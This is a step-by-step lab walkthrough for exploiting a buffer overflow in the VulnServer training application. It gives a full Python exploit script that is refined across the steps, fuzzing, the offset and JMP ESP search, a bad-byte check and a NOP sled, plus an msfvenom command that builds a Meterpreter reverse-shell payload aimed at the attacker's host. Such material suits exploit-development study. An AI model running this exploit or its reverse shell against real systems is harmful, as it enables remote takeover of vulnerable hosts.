# Buffer Overflow - VulnServer Full Walkthrough

## Step 1

Create a .spk script to fuzz the app and crash it.

{% code title="fuzzer.spk" overflow="wrap" lineNumbers="true" %}
```bash
# to read each line of code.
s_readline();
s_string("TRUN "); 
# represent the value of the fuzz data we are sending.
s_string_variable("FUZZ");

# make sure Immunity Debugger is running the VulnServer app.
generic_send_tcp $ip 9999 fuzzer.spk 0 0 # fuzzing the vulnserver app.
# the program crashes (we get an access violation while executing 41414141).

# the 41414141 denotes "AAAA", but at what point or which AAAA index did the program break? What we can do 1st is to know how many A's our fuzzer.spk script sent that crashed the app. How do we do this? In the Register Panel we see the [ESP] value, right click on it, click "follow in dump",
# In the 3rd Panel, we can see where the "/AAAAAA" starts and scrolling down to see where it ends. So we just subtract the start and end addresses with python to get total number of A's sent, for example:
>>> 0x00DDF1F0 - 0x00DDFD98 # in this case 2984
```
{% endcode %}

## Step 2

Generate our own python script to crash the program instead of using spk.

Make sure app is running before executing the script.

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * total_length # 6 - sends 2984 A's to the vulnserver app.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()
```
{% endcode %}

Now we have control over the EIP value, but we dont know where the offset spot that crashes the app is.

Instead of sending AAAAAAA's, we can use Metasploit to create a cyclic pattern of characters using the "msf-pattern-create" and "msf-pattern-offset" to easily find that Offset spot.

<pre class="language-python" data-overflow="wrap" data-line-numbers><code class="lang-python"># in kali terminal.
<strong>msf-pattern-create -h # view help menu.
</strong>msf-pattern-create -l 2984 # creates cyclical random chars, we can copy it, and replace the value at line 16, step 6 in the above python code with the chars.
</code></pre>

```python
# instead of,
 b"A" * total_length # 6 - sends 2984 A's to the vulnserver app.
# it will look like this, we are now sending the generacted chars.
b"................................................."

# We get the EIP value and use the msf-pattern-offset to find the Offset spot.
msf-pattern-offset -l 2984 -q <EIP value>
# it gives us the exact Offset value.
```

Our new Python code will look like this now...

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = b"BBBB" # 11 - this becomes the new EIP value, ie, 42424242.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    b"C" * (total_length - offset - len(new_eip)) # 13 - this is the data/address that gets executed after the EIP ie, ESP. Meaning this is the spot we wil put our shell code, since this is the new ESP value, that points to what the EIP will execute next, ie, our shell code. But in this case we just pass in a bunch of C's to execute for testing purpose.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.
```
{% endcode %}

## Step 3

Making the data do something else.

At this point of controlling the ESP value, we want to make our EIP or Instruction Pointer use some location in the code that tells the program to "JMP" over to the ESP register and execute the code (our reverse shell) thats in that data/address. So we are looking for a "JMP esp" instruction.

We can use mona.py for this. In immunity debugger, type the cmd in the below text entry box.

`!mona jmp -r esp` - looks for jmp esp in the kernel.

Mona displays some results, we can go for the 2nd to the last result since it has "ASCII representation" and all protection values are "false", right click and "copy to clipboard" the address.

Now we can change our "new\_eip" value into that memory address value.

Note this wont work because its a memory address to the binary, meaning we have to convert it to the bytes encoding with the "little endian" format using the python "struct" module.

Our python code will now look like this...

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    b"C" * (total_length - offset - len(new_eip)) # 13 - this is the data/address that gets executed after the EIP ie, ESP. Meaning this is the spot we wil put our shell code, since this is the new ESP value, that points to what the EIP will execute next, ie, our shell code. But in this case we just pass in a bunch of C's to execute for testing purpose.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 4 - Bad Bytes

Let us figure out all the Bad Bytes that may exist in this app.

We can do this by sending the application all characters (every single potential byte) the program might use.

{% code overflow="wrap" lineNumbers="true" %}
```python
# lets use a list comprehension in python to do this.
# we use the struct module to convert the intergers into unsigned_char, then convert them to byte with ".join".
# we start from range(1,256) in order to remove the "<0x00>" null byte value which in some low level programming language like C, stops the rest of the string from being executed.
all_characters = b"".join([struct.pack('<B', x) for x in range(256)])
```
{% endcode %}

Our python code looks like this...

{% code title="" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger (this is our jmp esp instruction).
all_characters = b"".join([struct.pack('<B', x) for x in range(256)]) # 15 - passing all characters to check the app for bad characters.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    all_characters, # 13 - pass in the bad char check.
    b"C" * (total_length - offset - len(new_eip) - len(all_characters)) # 16 - this executes C * the result of the maths operation above.. :). RUN THE CODE. So it gets executed, now from the top at the 1st Panel, rightclick, follow in dump, address. Now we can see 3rd Panel all characters and can now start checking for bad characters (ook for any suspecting outlier or off number). We dont notice any bad character except the null byte.
    
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 5 - NOP\_sled

Since we dont have any bad characters, we can actually remove it from our code.

We want to add some "nops"&#x20;

```python
nop_sled = b"\x90" * 16 
```

Our python code now looks like this...

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger (this is our jmp esp instruction).
nop_sled = b"\x90" * 16 # 15 - defining some nops.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    nop_sled, # 13 - pass in the nop value.
    b"C" * (total_length - offset - len(new_eip) - len(nop_sled)) # 16 - we can run the script and set a breakpoint at the copied memory address value, and we see the nop showing up after the breakpoint which we can fill with our shell code.
    
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 6 - Shell code

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kaliIP LPORT=4444 -b "\x00" -f py` - this generates our shell code without the bad chars. Copy all, be weary/conscious of your buffer size.

Our new python script now looks like:



{% code title="" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger (this is our jmp esp instruction).
nop_sled = b"\x90" * 16 # 15 - defining some nops.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">

# 17 -  paste shell code here.......
shellcode = buf # 18 - renaming the shell code. We are ging to be placing the shell code after the nops.

payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    nop_sled, # 13 - pass in the nop value.
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode) # 16 - we can run the script and set a breakpoint at the copied memory address value, and we see the nop showing up after the breakpoint which we can fill with our shell code.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 7&#x20;

Use Metasploit, multi/handler to setup a handler to listen for the connection...

Restart the app, run the app then run the python script...

We get a Meterpreter shell !!

